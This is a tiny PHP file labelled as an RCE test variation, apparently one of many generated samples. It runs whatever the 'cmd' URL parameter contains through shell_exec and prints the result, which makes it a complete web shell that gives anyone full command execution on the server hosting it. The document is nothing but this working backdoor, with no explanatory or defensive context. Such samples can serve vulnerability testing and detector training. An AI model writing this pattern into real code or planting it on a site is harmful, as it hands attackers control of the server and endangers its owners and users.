<?php
// RCE test variation #997
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>